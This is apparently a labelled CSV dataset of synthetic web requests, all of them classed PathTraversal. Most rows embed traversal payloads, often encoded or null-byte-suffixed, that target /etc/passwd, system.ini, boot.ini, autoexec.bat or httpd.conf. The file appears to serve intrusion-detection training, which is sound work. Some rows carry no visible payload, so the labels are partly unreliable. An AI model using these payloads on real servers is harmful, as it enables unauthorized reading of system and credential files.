id,class,vector
3716,PathTraversal,/nCcbb1iVYWsu/12dnrdntendothf4Ugii/ardTwyt/oFAHu.DDeqZe/3pne/tcat/bYMgk4fqdlYT2T7@wS/JIkNmSDlib5/deletefqQFdeleteRuQYQj/SGAh0/onnfhx@VxNK/WjandQ_.htm?rztdseyt=d2iuo2%2FW1%27eLh&ann=7075&smNzhaseE0=62885&fDmeohslesca=nnihdurtgxjtd&nm=ci0.%404x&e4Jl6-FZn@=d%3B&ntnqnaiMet=nOTg7&ed1=nneia&yb=Llrdn&rRedzcl=me+1&hq7z=It&Entloaet6bnna=%5CWINDOWS%5Csystem.ini&jcesxstq4gRo=sse7cenchildtiJa7j%5Cr&i6ec8enp1ash1=t9oaoO&loeTqherHinyfot=gadoy3+5
3718,PathTraversal,/4TvT2UQ1/unmnon/qsVOuE/yerskhhe5r/insertJvarcVcT.shtml?llbreRiSsfnse=iWUmwt&QEo%urevalEIzAY=Lltdr24syeh%5Cs3y&dTtRei2r=rCmqDIA-G&DP._plJv=120835&yEEZvdiv-WB=o8cSaIBXs84hMeN&V13lL=rftoemlei3ua&aiHefh5r=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fdeesllan%2Fme%2Fdechli%2Fin.cgi&vBq7n=p63qA7g8Iyr-&wU28=lictEh9tt7oysaj1he&Jet0oOE=87522&h1dd0=e7ortxtitlake&dmriireetrx=092327205
3721,PathTraversal,/op4U0bbT4S/x0/urmT6UcP3PBY@pT/hWiRSlhbSEvn/DiDPVD/8uXnw9sv1/sheEb15qsVft/etq/lY.exe?OnoEerehD=342132041&it0tesmIsm74a7=reunion&kcRdvbOp=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&oLemC8htiGda=a1iemabla&snrtne6loaeoIl=018
3724,PathTraversal,/sq5sA/ldqng0vssNmg/ugenritxsw6Asteicm/5vcvh/eAUY7_BfUsEvvrdez_/72cSaPQY/seZunionAy9c1.png?dirrnehiS=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Feras%2Fllor%2Feles%2Fto.sh&vsewe1=26367&sbl=nYtitDestv+a3Tnp&sh3qL=scriptenAcvct&e0chQdet=bodyrr+l&LfMls@.LlogYd4=u3S7sr&n6totpNDdft=eSeusrerhtuare&Cdnnwstonvpaeu=sem%3AgnDnXep&9LzQmr=74&oIdRweDodadtsml=iemeHeSib&tnnae=nrel&taHiedao=hdfhRlWe&Hirb3Q=75658
3729,PathTraversal,/f_XfdP2wP5_/yerereb/_p4rsiBW/1C/9atsghhpr0/etcABQP/bhawaiei9b.jpeg?hlaeboso=a3&wrrtbe=uc3l8VuSR9yH&asnbHt7n=tt%26o%3B&pe=rI%3F%251sec+nph-seid&te=ot0t&rsehlll5esm=a%26%40-dta+s+o%2B+&hmenrIdjerdpa=2&r30w1eecdre3e7p=+94e&jeuekahemrrr=eRD0&9hmhrti=%2Fetc%2Fhttpd%2Fhttpd.conf&egNoloea=9412921
3732,PathTraversal,/shernuiftrra9/orCsOLb/S3/iC.T/8e7ORskd9taeeti/h4hq1blsA./rmczU0.php?GAOb=%2F%2C%2C%2C%2Feoehr%2FniuTnn%2Fpasswd&4t=258&mSnrr=34&ez=aA&4zHdlinklincludevrGhD=te9Snttuniondee&tntel1egpn=aeswlvo&0eIntdytus=b6HzTH8J3&rR9ainetna03=kaE&rae=z_prTMw&aisnigp=pf&bphpsyQbCMwCv=hBCOab&eR4orhoi=e3rehwte0uw&y5r7JcydocumentkG=+loG&n9alnjeQ=265682&0aeNx7Hxterm=%7Csu5ombismtp
3736,PathTraversal,/ioemMHCe/tB@g1928g/oneo0eickg/gQBE/c3zef4el/8fyte0eaao/erjR.tiff?7lZebeay9=eswtuDzfulselc8te&aqodebof=fcDoanrD&utrns=+hRD&hreuense=sHrn&es6=s.jMl&weuwtzhvoaRog=7815098&7shptmths=%5CWINDOWS%5Csystem.ini&elhsmn39av=e7%5CrzTkslb%7Enri
3737,PathTraversal,/stdin1cjWO2yk/fnoNpvda2nenytetnyer/og.tiff?7t3yl-i-=6do+&5w=ihhkMp27&Eztsheii1Mtkg=cesEli&qmaemdsmcht9ij=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&EZACcQnJKMrM=rnob&tNnnepcomcdx=amfeSH2Sv&1utnuh=719&s7eehdmuesit=els4Gtteis+aqtExeie&nwanptSneST=79114892&C3azadminnFehttpsK=oego&WLnKLnH=%5Cndrop&UCEb=59&0yZzJ=wrndeynfoO-
3742,PathTraversal,gErzo=:lacowhereaesamec:e&nWrdorsuir=access_logc&poeeuhGTpx9Dn=../../../../../../../../../usr/yo.bat&ldktnesra=no4u=
3746,PathTraversal,/mrK2E.79PFYtxV8zhG.X/eaotbeL9/p8seeii/nb/abuy6e.tiff?@mKiEilike-kqZW=%2FhlnW&eiE8=sSUC&Esex=55681855&exopjpjoe=%2Fetc%2Fhttpd%2Fhttpd.conf&a7taaeaneIa8=fsav&dNulnntr7o=mosHImtad4An2hhn&ir7h7fnc7a=ta0dedLEd4lxmlst&aLDO=6180995947&wdrtonundeesnie=89180308&shaieso9=%26+
3756,PathTraversal,/a7F3O2dzBK0.HMb/ldf7HeMR_Jn1.QlFciG.htm?ta3nacmoesnt=r%3Dfr%2Fttlas&evu9igishNai=c7Qd2cM&eno5i=ipositionstjoytNi1h9nI&eadope4xmR=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ftara%2Fsttitrst%2Fen%2Ftendlier.aspx
3762,PathTraversal,lSms9aIvocT=fnti;dDKui&eemoho=wtcdveaf&qaair0naofdeHao=s\z78tslopenqea%&htaermbeNhYEn=tHn&edYitIohmhojlfd=6816142&1UbsdivV3T6=nf1a&Mz67236Jjx=671&Mvoionu=/ow ANhrRc=stki&vh8taqRos8a=t/%sP&mhh=H5execandehok3th~ldE adca&gbgi=25405&eytrwnaernice1e=[iws|e|etdivtv$al
3777,PathTraversal,/Oiieelpf7ee9/iL/9pB/CooJz/yBuLm.EPjda/m6IeMUQz5zCQ@lBqlNoZ.js?I2hnw=file%3A%2F%2F%2Fl%3A%2FHOh%2FwmiET%2FuA12sete.xml&xyJNRKYGH@services=hIe4%7Enstiastyleh%3Ez&ertzeomi5sTa=eNfTwyQDH6VP
3788,PathTraversal,/ieiu/ttfldil/eg4BxBrM-EtHLepvs/03ETr6RhlYBLJhJxyBb/io8jtlR/Hs6Te6.js?t1cI=%40h%3Bas&en7w=nsNAs%24%25%5B&nl1iA=32048&9iEmre4eSd=lta%3EltimgscriptlArY%3Ak%3Fy%5B+u&F5L9BNyNRY3=926038&dc5sdetildrE8l=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&1Q1p=myahhlNSE+a+m+ohaving&0ffce=23&agtbnotvqga0r5=irtrOid&PaMtSinputQ=cier&zeoGh4u3as=64369&ndooortmlSmu=49417792&es3wj=edtrpzaaeez
3792,PathTraversal,/cnnjnfleIn/Tje4ldheonnneito/tZLJJFxG/eoSZ@TPC7OCVnYXx.bLE/eXQYj/emhsenenrsEdarecesee/tdclIaiatcsh/sC/1sf-GsLiMXYNWY8Wdwd@.bin?vudigOnpen=sLZUYebOX&bt=tnzFn&YFI3N2i1@cat=257748594&7ieRtan2=1630&ostdin7YMLC=%24ty%25u%40h&G9Xupdatezl=pss&putch27oI=hZRPq.yrhC%40Y&lieyEPi=0&icta=thnetdscs3t&guaohett0WaEo=7071066&RoBpm=8434&rBirahofuryuCs=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&otosa=smahr
3795,PathTraversal,/lVGVUD-DjB7.jpeg?Ee4tdlf=%7Cma%2B%7E&n4iuk=2itgaadncfirftw&oxfenu=rJh52M&thiyyE=khTilahen&nfpnsafc6aIy=totr&FLRinputv2=+passwd-s&zoinU=4KfeVE-dEEx9&ltstaae3hlooq=%27%3Dyofhnetcat%24detq3h2&ttret4=e%3A%5Cautoexec.bat&m.uRdp=cgroup+byinhnczv&eEcieTRrm=66054811&fZuF_9in=ds&7Oc9otbsnkhanne=fmwzH_eqSNB7&s5eiin=hsdo
3802,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
3809,PathTraversal,/cxi5VgYoRzh2-/lD_6/l9kaqWV/sY/zdIenioees3xenqsUe/zcbntb/xmlqDEO_olocationcz.html?Re=s8ho&bu=98443&YrvLRrQselectN8s=0dtost
3811,PathTraversal,/6thcGTBssnD/hyD9aDbinqBNPSo/doieahlher/h@YTOqRnO-YXxiy1pu1/eE0Wq9zZ.png?
3816,PathTraversal,/vihurbeneeuou3ce/bor7A/gHRQ8shu5SlcwJ56.png?yR63T_m=ehh1
3821,PathTraversal,/l2eGXxKLWG/wqbqee7ueee/uZGtVqVI4ZbcAr/rF7maSrD4KG@9ZS1uB/nUJRwkNK/thT9Iu9gdK4/l6diod.gif?omt=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&zprOcalibeqM=r8YV&Eqsozrt0nn=0544321382
3826,PathTraversal,VctrJ1vT8pJI=g6ot&Gtosoe7=n&o8eoTd=\WINNT\system.ini
3829,PathTraversal,/Aformhtaccess_documentbkx/updateNI8FmyWw7Xchild/sBm1_/rnF/u39rop/Ap.gif?nt=7&fA=8&mni6jtoaYia=sf8s&3yB4=33&liteIjotbdahct=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&2Sf=eskbw1pmazY
3831,PathTraversal,/timv.fhvsy6vAK.Q.html?rryni=phr%3A&qSjefuitXsE=89428&dEr9eg=likee&6uu5S7nfl=sxsa6ee4se&hi=0yUPM.P&edil7neOpmir=0&tl1brosmdef=59828153&P0aJTN_jUlkwp-=o%3A%5Cautoexec.bat&hho3sdoibtk6=dMj&9sniet1tdu5ynw0=telnetlop%3Fieh%3Bxsam%2Ba0i
3834,PathTraversal,ghnieejn=s:\winnt\boot.ini
3835,PathTraversal,/nor1L/eg/NwdeCynaStowkw9ryne/mUalaneeflohron.jpg?dh8o1aAyol3dsie=euconnecti%40o5%5DLqesl+&Feoht=eotDwtYtjcien&Cecnhahafnwet=kiIp&zhhnft5v8psuh=%2Fetc%2Fpasswd&ass1umpxltate=215775&NiaaedobFlno=inahhoqynstyey
3840,PathTraversal,crenhnAotttr=..\..\..\..\..\..\..\..\..\WINDOWS\system.ini&1eprehowe7eub=994922
3843,PathTraversal,/qjaJ.png?daO5h0T2ta=shtWntyhAe&csi=dqlL&0nb=e%3A%5Cwinnt%5Cboot.ini&qHOi=%7Cmetan+&HQpCsAf=osa+mh%2B5a
3851,PathTraversal,/9DTrzf714/oPCme7ZviE5StkhmNr/4GaSnA-qjpassthruadmin/a3.M9ED7/1sIICdYl/9TCmIwp--dEm@/io8tErp8n/tawSs2pis8t/hZkOM0LN80xWmB2qrN/e@IopM4KO-0ye_VxeI1/llmPIrmDO4iGqAscript7.jpeg?iqeihqhf=ontoanrhyia&DCKh=+irsi&.7Jt5ZP6docB=hf%25beNee&ttRenoo=nRuoaccess_logaLt&uISenon=%3Ad&oer=ftp2+sock_streamt&tWhtacceshG1=9857137437&riiDt=ug
3857,PathTraversal,/n2oUMsQUKjfsAqsZeQQ/ae0n2ospnaawh/zBJMU2d.asmx?u8V90u=0&aJcnWmi=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&huhrlnPo9Trelos=aeeeGbsteseu&2ntMaAz2nne=sd
3863,PathTraversal,/o57M.qEvbU/tndqghwiinianrrnSuy/Wbody2WSZ_/Sua7tsetRND7eny2S/eyMaraaace8lbe/rbdutn57ac/s6Q5gs/aygc5tifsvM3iNhseezn/hnsSqeAsreaife09/zXPhD/YoKzOYmu./sbAIgtSouM2.cgi?iso22ijia=eHs7mWsYs2g&netrpoleiihr=ftp9%28w0%28+Z+nt%3Eaacopyetot&rcD4tiumsihn3=1312427&tombtnd3=cseeBEnofuneellh&mow1zsebaefe=enrnrNeteeore2Or&qQNgGcJp=se%2B&CnullR5wy=%2Fetc%2Fpasswd&hHrdhewn=%3Dnsga48lnoAip+&sxty=tmpfEms
3867,PathTraversal,twrte9a=cse<l&aimuaeN=../../../usr/dsqqdsqsd.xml&ioeretIe=58&r8e9eLPrd8lwo=lllo6ewutrw0ipmoq&ywaokAte0ieotn=9&odrsmryl=0680&nob=esljEayplt4u2e&7uIinput0K=e7ti&tIwp-6=m'srai@yJ(Sd &-ytNjScQ=519396&tsnoofas=27
3868,PathTraversal,/b5/@eQ6OqrnodeE/tndrooa6rtlOjnt/jhHKtPoMepMrti4Lh.gif?sn=link5y5eoycj%2F&eat=eEV5xN&wnenmal=uObixR9x&Acetcc8ty=HocwiQiclstdino&bsoLtT=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ferin%2Fmendsili%2Fsiorannans%2Franide.jsp
3878,PathTraversal,/q59WtXZjRl9aJIF8Z/uhgheolT/g1/BO2/e6h.LAE/gggratefnbsi.jpeg?uhdrntpmtu=hue7K&ge=35519&wli5=7+E&VtmpobjectPJv8connectxml=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ftaolretaor%2Fisertoer%2Fte%2Flenensst.pl&doeLtllcuth=64ont&tpstrewetesCtr=bdtoEehMeale&eet1uteeAdstra=2520&betweeneyi=PlcrZechorsaiesxp_8e&.maMsYJ=04s&tluileufs=677279074&vRPpsen=rXpf%40ds&z6N0b5hste=oqto8o%25&rr3ldmolt=6t+4zeynfstyle
3884,PathTraversal,/7ZTl.m-9c25Eri1/uFF@9V.php4?sw66awuezio=027&scriptUKLb=i0ye&ehaepalA=0%3B&cr8ec=dtOLeut&prmbe=hfKciEV&FfcmdT=xnao&8aogn=6&enhenom=+Or%3D&twqa=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&phLrnpcyh8Op=pxrv&uneeelaAt2ibdlr=enandvoSdiveata%3CNqEirl&c4SsySuslborbd=zrja4pslrr&YLp.b7Cbar=85&nERB22M3K8imgk=8hfk&3lTnaoiotfH=a%29+aE
3890,PathTraversal,/ou-J.bin?ttMamoreene=..%2F..%2F..%2FWINNT%2Fautoexec.bat
3900,PathTraversal,/2u/etw0Nwt/as/wRr68ceiuu0lmsein/DBA.css?spnfegyeheiai=nhzedurssen8&8mnph-adminuPoB=eerhtstiiopenn%28%2Fsp&yoooEqvdh=7eiiep9errheir&ASht=831744&9DA52a=h&_SoformRlEze15=9550835&jwUr6=1%40HiY6VFimA&OnthotkeO6C=8908&att4leo=4056&x-script1lVsN94q=e7eJE&hq5rgbow=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&trj7Rpir=cMThM&t2aiTdt1j=esieh&foqioued=dropra&qYMJr=esTgq2iq0U-J
3902,PathTraversal,JtOz9tXX7os=oc&CSNMLiVzCCq=]aHeEsSe)Etsr
3934,PathTraversal,/id0azTdshrrSrt/Oa/e1du_IxWJN7X2bs/euQuC6/oE/pc..jpg?etm3nCi0mppcIi=ebu&OkaAPs=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&9NuXXsystemCzZ_8-=%3Bwnsapositionb&DoFo6=0787
3947,PathTraversal,/ahixsr8didseofstT/f5-Dh/3wNo@sfXOtPI9wPjdEX0/hEN/lhJ/hkYBP0shDZNHDoIu/rbooydedc/roe/mjQ7oLU1NXn/tmu4laecmhjtusiiue/iendua0eCDinrthte/eWxmwDljvYuG.dll?bhtpass64V7dW.J=45896&heaEttNd2=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&QVphpsls=5482&0wscut2AoSd=rRP4jgG7NL
3955,PathTraversal,ft=776056729&naoa= ?&rDqgCjmIAt=\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html
3956,PathTraversal,/cZuRtvW/fM_p9UVdbWjEGvnT7GJa/tesad0ozrmnntf7Ee/1KIbvee/vYXl6562XlKC1/negYam8pOqEXI61LipBD/y30rK8cYOrmuo94ZJ.mspx?YGHOO4T=6448560&ncetbgbd72N=1183722&liiibjhm3nooefl=.%2F..%2F..%2F..%2F..%2F..%2F&rkou96e=es
3957,PathTraversal,/OblQ/vJkX0K/recH/rnIn/-MgaOVTA.bin?xWktXandfNzphpwt=ijdl&emomtlt1=i6ohhdRfaa&e8heis7ydtp2n=3&24ietA8a=os&9lhoi=Tei3cmvro3leRaDtm&ynssnhie5bnmfan=ezr&trtddsljeahidln=et6oaletirOoservicesrE&utg=5839&e2=eot%7Ey&atseUm=aRiO
3964,PathTraversal,///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////?
3973,PathTraversal,/jnzBrkBXQ-WOx.c/hqelu5cintee0Csx7/Eerasn3otT/75onoas/j2iejewsPow6tieliypt/itsnin9ttEhcs/zlp/6e4UgQ/f5br.shtml?ta=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&zw5y-=613603&tmittshTwa=sunionechosTeeevalenTrwwEnTz0
3983,PathTraversal,/alr8n/rmTP1kFgB2mgIO6IL-/i0easRLn/rUH/su9elne7ahI/i3pm2hxnUIrsiDeNra/aqlNMRBLIr/2xa1nteuTt/z7Y@i7zMYATP1c1tRfB2.mspx?stoii=2&or3ltelnet=ea%3DGwYtl%27roiimetY&peefh4o=88vil1kpG&txBomHfaeeh=auvossirEnao&icnbnq4fse=774402112&Rdnsetn0teo=%3C%21--++++%23include+virtual%3D%22%2Fetc%2Fhttpd%2Fhttpd.conf%22--%3E&edoaoso6tcsmnQg=574&erTtfjo=1&osy=dMG2MjVx61x&9t=ge5%3Co&8hacdplnfzcij=48540&enwhhjsdhl=muUW_6rr&ss1anrusdw=2o7s4uEnes
3986,PathTraversal,/6sN5IR-0xlSGh9ti._Q/iv1umad/iXsbAnRP2itPIp/iJSUZ9/e-A3due3S6OL@B/aEh/O-5vO/rfltsdniigsarumoa1/iuE_ZdIkxoewj7/5telnetkf.jpg?TA88cpre=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&crPt9=254&Ig5liosgs0u=thsmuiveo&ilhthal=dt8mimmadhnsEte&ses=iuoHhTnkas
3998,PathTraversal,ahqtilnc5trwnie=/etc/passwd&qAqs=4171565
4005,PathTraversal,atwwwAeeTiw=\.\.\/\.\.\/etc\/baeg.conf&PVbcOXTu=i$
4016,PathTraversal,////?
4023,PathTraversal,rA0lv0ioiwo=466973&yenixaduelI=tI85xsctohURai7&Iaa=6ASJjYFXG&insertcPAfUS=79&4hgaeeaauaunei=\l&ecmdcp49R=\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html&ed4uhokf=etnlss  ?8ct Q ss&J7xmlyw7=1405270&Sbiqeldscto=i-&o8Gbiyil5eba=trsTmrenuc&srnixnt=50678858&ega=eVKUnIt&oeev=iWEdo30&r1pm5tet6e=TAebww0irltcxxea
4049,PathTraversal,/elink3IRo3jj/s60er6sThraRewogMty/likevar5m.bin?4P3OGwEY=oLvkeQj2en&lshutdownmKXGPt=brdnrl0n&atdut=nh6-&rsfNbdgorm=tRko&L-QbrdWPHhmE=7BG5Y&63testi0N=zl&medr74ye1srddge=ge%7E%3C%29bn+ds%40e%7Enn%27includepnl&ahpw=xijohBsSx&ereoyen=pHr&xreebeed6=mSmmee+%7E+eNestyle&xNtoihsdxstte=icl&Faobtn5et4ia=88920796&p15iwShvO4s8=hoya3mtNteiccbtiO&cjs4se5ilwaoo=eud%3Fnart&jaaowwlgtee=euSfs%40l
4061,PathTraversal,/apwA9tts0toopsoAt/tavcUnIxQIT6EdBy/ilFLednayevoHdyo/n6m1lRtgBeQgTHkO3Yer/oudXQ4.vd/jaQ/qreysf/aeQx8SzLW7fo3d2sdZnj/oiwadAsnToVyiS31rs/Bea/tF0Z3P91APi.sh?ssosOiheDeeetb=jUZB9lJ7UtXW&clq=v9WNv&2unade6oi4sd=30448960&oegjoo04os=%5CWINNT%5Csystem.ini
4065,PathTraversal,/itUsjW3K/sZK/d_P/aionailaey/183a/szfyr.exe?ee7hu8srhieyd=%2Fetc%2Fpasswd&@aOIQqN=lng5n2hUae&edntSntloa=cwnifiLvwst3autta&toen=0148&b7idomhepsnnrdb=362&yaterby=tshr8e&rLauKXGV3=026
4089,PathTraversal,/tMmbl23EWfdF/4sM4Pb9styleXD3ts/bK/oJ5Atchjl/t74hE_9/trGrntw/elao/hMyX5mu9RW/cHiRT/yuFOPuNAH2.png?jt=846612&uncs1lmeVihcj1o=MaxxlhU89iolo&thla=90832526&5ueeooseivo=%5Cautoexec.bat&samHthnpmr8ts=4550
4095,PathTraversal,/bpaidxRxm/e0H0fjWJ7Gy@q4Ubgl/x94-4aB2z95o4/8.B3joMIXtSmc89/12_/bhiDt/stdsif.php3?E3_GVKNQ5qOK=fd&aoaaojmahsPGnse=ag.57VXRCk&iworSslgb=s66h_85fN.ud&ndhtrehswbfEdnc=30tasgiqht%2F&seuenp5sddeowe=-+si%3AleYifBdoiseL%2F&5YOGZpCoCM_5=617448439&t5owesqimcn=%5CWINNT%5Csystem.ini&2eemxhIqaneeuFu=e9ui6wp-&emttAderaen=a-XUI&wS_nTJEq.s3home=eTzigJ0pIa
4098,PathTraversal,/dBz7SHG_86W27metaT/enodeO9FpassthruCbd/aR5n/pt/teEg-AgbX_J7zgOQrN@/uf.shtml?Tn=i&P9eVe=d8zr&aVbnA-NHz-=7ksN&enmsfaagase=n%3A%5Cwinnt%5Cboot.ini&xtdi1kHt=%27niME+nc+fml&u6iien4a=tvhT16s&cat1.sjj=ht8ntun&N1=aaic&aiisxTepod2n=olg%3Dkelfelt&9g9RpPJoq=fosaccess_logecvar%24qn&tc6iobr=u56onyceaj8aobrt&mec=956&6optzfIx6PaGP4=00764840&seaezkThgAbire=02581&Ospcposition4SAf=58603507
4104,PathTraversal,/rBWnY-b_6CrzDVrhmMAT/rHp6ouolteo4a/o2/wcp3e@iframeWV5ttpZJ/etdLYuRJcoyCnfFkD@l/SUmmb_0azpo/7-.js?ph=hWUINB0%40&FDtf=%5CWINDOWS%5Csystem.ini&yntrtortc=tDxiEaeTo5liko&SK.9e1g@r=eiishs2lw4ra&aSwnelT=33&tordetmuon=styleeinsertcmtdmnsincludenullen0icM&B7rhttpKmeta0=6518
4136,PathTraversal,/i3mrGG32c/shutdown9aNt1d@/YOOC8PXobjectdblSf3F/ene4l6ictae/pAkjO/vincludei2.4/dwueaeh3ritwhvtTdtoe/1w45QhSo/o3ch8XN9v.jpg?rAeqmyuaicO=sc&ileinjcT4e=d%3A%5Cautoexec.bat&TdhaciedcocoOnh=dX..r1QI5R&Ev=lsejteehGwe&IXHqphSr3PT=1&eelitatrose=13705&erheoctlae5ElEe=7gm8y%2B&hdaybpi=329967&aontnpdhoice=%5Do&p2degE=mS%25&insetepovt3nh=cdc
4140,PathTraversal,/rfml7XZQK4N4ee9_TbUY/OaGDmZsYYUW/rtGs/htbatrain/eGVIRDnRumXQm9Xc/BnodeKOljcperlV.jpg?a2Itlnr=4363270136&KPQxaep3rQAx=o2msmemhtpassadmin&49nncaELlri=yMTRRJ2jvUNX&U9=he+%28emrtdnclreplace%7E&tipimens0Cnt=1126&sr=%252e%252e.%5C%25252f%2F%5C%25252f%2F...%5C%25252e..%252e
4141,PathTraversal,fBYVtV=695188
4152,PathTraversal,/oomlkfB30oaj_7GW80a/ygi2eval/purKQnv/tZ-9rWxxx3XyyLOh/ag@pzgX@.@YHriK/Nfi1e/ZwinntVZsB9aICR%u9C/kat5/2en0iOsCjQUX/5aA/lzdketomcu.html?MOZinqY=y8httpsao&avhio=Rt7eFaa9owAaoasol&9lgecw=%5CWINNT%5Csystem.ini&oe5bpl8idhr=i+p&@.eHLzbG98G1=nSy_QZlk6
4153,PathTraversal,/SaPM/plknuInOlsltnnjen/tvetd0liir1nlc/nb0_HHD4hwp-olTcR/o7g4imjI/ig0W/tsLcoHniyHtT8psda7/4qzi52nAugToauee/uJKKpXwvmq/U-XptYBJBL/9XZoZcKc.asmx?h2e=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd
4159,PathTraversal,/ne/aQM5Wc/PAjO1Z9ewq2Zqe/QY-gm/Cteiscn5beooe/evmD7ND9SV1/8oriobhxSeTa/5DFzrOiCatAc/rXaomarlog/o42kRS5iHxrM.MDu_/et2iTveFnaawnet.msf?iHt61nafccvnhno=9918&uetcJj.Pa0SformQ=%2Fetc%2Fpasswd&xcy30vouUqr=1%3A
4164,PathTraversal,echoKbodyT=ruOQ&lhd=im37enpae2eh&atptrstinKn=d(gW63e&fsou=8549&rrBensmvxnhiret=tET&fosnch=500601&esm5sosjjnae=7and(&etizichciosae=tL5t&eiLzuauhscaAii=a=xe6u&srvuin7Itohetie=renf&echozhGacceptGi=t8kcusx51mCTm
4166,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
4167,PathTraversal,iseyyo3teau=22&Cp5=4019&wL=g&&NFI7-KGuEbG=981043&pmtdcsrseedbld=nPLV0Dj_h0&ob9n8talrldilt=t(naLedt&vi3Enhthtn=65973184&sLtnnSstt9tsr=305745936&sDoh=nxg
4168,PathTraversal,exToiiIkrotaI=aupA&Lqnisada=a&2eAaacuMtteeeos=0&lrfn=rVAdqrHO9&2etu1crx=aWdKEX2B&epviiomo=Ae7i6HtsnrUhftdg&nwam=o(o$&nl5aao=9039189445&ss2taphp450jsia=6'wads&wsweh5&@bU.JR9Bjmail2=4&vett5xa8hpite6l=2740&1aaenst2nF=l6X
4170,PathTraversal,/z7iSs/usiuzneni7ho7od/aetmmhatghn/0rntoi/uBdW@M6U71/mht5teY07hfene/uddhdl/tP3Wyi/copy9/sSd.xtT9KozZ.dll?anys=298093398&aetedrrLl3TPc=472947671&Iaee8ogerosDeo0=49945&cmdU2cfpsqyv=xICoXTz7&owz2=rdnreal&6saogeieeeejlel=DO1
4174,PathTraversal,frrfHpr=U&rma0Lhes4twrfbn=uks&9x2cpiAu=hTa(sieear)copy wget+fr(5&Tntrsn2gz0=oh5s+&ieeoiyamiaunrio=ucrasigdtuHa&45IHioevhnw=whylssaeshn4R&suoaisda2eEoeie=..\..\..\..\..\..\..\..\..\WINNT\system.ini&mTOabbv=ahe7dleo1heV7&aoh=dqa&gNechosystem9M=openumoodsdhomeise=j &l0EIueieaef=dYBg&oeh=on4icb&ntiSd4n=dHrdtXRal/7&FG=s00eo&ncnra=uxasIiratI
4197,PathTraversal,/eJxHLyV5@meCQbrgOK/eloa9tg38e/cC/v2A/dgqd/eSgsl/T.w.kGbgsoundoU4lXs1M/t0mlehiAocts0/EIhIrbotpjtr/ncyo-YP.hF@c9/nYzdH-lognZ.pl?ILinu0=potdaf0i&4dt=%5CWINNT%5Csystem.ini&6wlmbamuetheeag=n%3Doq%5Bu+ldx%25dcpoHexecN%40s&aurtOyC3m4eId=ascripta%5Du%40&Irdyde=includeyevmon
4200,PathTraversal,/f8Lilocation/n@835fHDlw7M4u.exe?iJpisulco=a%3A%5Cautoexec.bat&amu8Tiao=odocumentmlae
